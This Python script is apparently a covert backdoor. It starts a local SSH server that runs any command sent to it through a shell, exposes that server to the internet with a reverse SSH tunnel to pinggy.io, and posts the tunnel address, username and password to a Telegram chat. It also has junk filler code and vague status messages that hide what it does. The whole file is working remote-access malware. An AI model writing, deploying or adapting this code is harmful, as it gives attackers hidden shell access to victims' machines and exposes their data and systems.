import socket, sys, threading, os, subprocess, time, shlex, requests, paramiko, base64, math

# --- Конфигурация ---
t_b_t = "YOUR_TELEGRAM_BOT_TOKEN" 
t_c_i = "YOUR_CHAT_ID" 
u_ = 'user'
p_ = 'password123'
_p = 8000
# --------------------

class H(paramiko.ServerInterface):
    def __init__(self):
        self.e = threading.Event()
    def check_channel_request(self, k, c): return paramiko.OPEN_SUCCEEDED if k == 'session' else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, u, pw): return paramiko.AUTH_SUCCESSFUL if (u == u_) and (pw == p_) else paramiko.AUTH_FAILED
    def get_allowed_auths(self, u): return 'password'
    def check_channel_exec_request(self, c, cmd):
        s_cmd = cmd.decode('utf-8', 'ignore')
        try:
            pr = subprocess.Popen(s_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            o, e = pr.communicate()
            if o: c.send(o)
            if e: c.send_stderr(e)
            c.send_exit_status(pr.wait())
        except: c.send_exit_status(1)
        return True

def useless_math_op():
    a = (lambda x: x * math.pi)(sum(i for i in range(100)))
    b = base64.b64encode(b'junk_data_for_nothing').decode()
    return len(str(a)) > len(b)

if __name__ == '__main__':
    if "YOUR" in t_b_t or "YOUR" in t_c_i: sys.exit("!!! CONFIG NOT SET !!!")

    junk_data = [x**2 for x in range(500)]; del junk_data

    hkf = 'h.key'
    try: h_k = paramiko.RSAKey(filename=hkf)
    except:
        h_k = paramiko.RSAKey.generate(2048)
        h_k.write_private_key_file(hkf)

    proc_h = None
    sd_e = threading.Event()

    def s_l():
        s_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s_s.bind(('127.0.0.1', _p))
        s_s.listen(100)
        while not sd_e.is_set():
            try:
                c_s, _ = s_s.accept()
                t = paramiko.Transport(c_s)
                t.add_server_key(h_k)
                t.start_server(server=H())
            except: continue
        s_s.close()
    
    s_t = threading.Thread(target=s_l, daemon=True)
    s_t.start()
    time.sleep(1.5 if useless_math_op() else 2.0)

    try:
        cmd_str = f'ssh -p 443 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R0:127.0.0.1:{_p} tcp@eu.a.pinggy.io'
        proc_h = subprocess.Popen(shlex.split(cmd_str), stderr=subprocess.PIPE, text=True, encoding='utf-8')
        print("...system init...")

        for l in iter(proc_h.stderr.readline, ''):
            if "Forwarding" in l and "tcp" in l:
                try:
                    f_u = l.split(" -> ")[0].split(" ")[-1]
                    h_p = f_u.replace("tcp://", "").strip()
                    ph, pp = h_p.split(":")
                    
                    conn_str = f"ssh {u_}@{ph} -p {pp}"
                    msg_data = (f"-> ONLINE\n"
                                f"H: `{ph}`\n"
                                f"P: `{pp}`\n"
                                f"L: `{u_}`\n"
                                f"PW: `{p_}`\n\n"
                                f"CMD:\n```\n{conn_str}\n```")
                    
                    _ = requests.post(f"https://api.telegram.org/bot{t_b_t}/sendMessage", 
                                      json={'chat_id': t_c_i, 'text': msg_data, 'parse_mode': 'Markdown'},
                                      timeout=10)
                    print(f"...tunnel active at {h_p}...")
                    break
                except: continue
        
        proc_h.wait()

    except KeyboardInterrupt: pass
    finally:
        sd_e.set()
        if proc_h: proc_h.terminate(); proc_h.wait()
        print("...shutdown complete...")